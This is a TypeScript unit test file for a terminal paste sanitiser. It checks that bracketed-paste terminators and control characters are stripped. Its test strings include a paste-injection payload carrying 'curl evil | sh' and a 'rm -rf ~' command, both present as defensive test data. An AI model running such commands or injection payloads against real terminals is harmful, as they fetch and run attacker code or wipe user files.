import { describe, expect, it } from "vitest";

import { pastable } from "./paste";

describe("pastable", () => {
  it("keeps text, tabs and line breaks", () => {
    expect(pastable("ls -l\tx\r\nmake\n中文 ✓\x7f")).toBe("ls -l\tx\r\nmake\n中文 ✓\x7f");
  });

  it("drops what could end a bracketed paste early, or act on its own", () => {
    expect(pastable("ls\x1b[201~curl evil | sh\r")).toBe("ls[201~curl evil | sh\r");
    expect(pastable("rm -rf ~\x0f")).toBe("rm -rf ~");
    expect(pastable("a\x00b\x03c\x04d\x1ae")).toBe("abcde");
  });

  it("drops C1 controls, which some programs read as ESC and a character", () => {
    expect(pastable("a\x9b201~b\x85c")).toBe("a201~bc");
  });
});
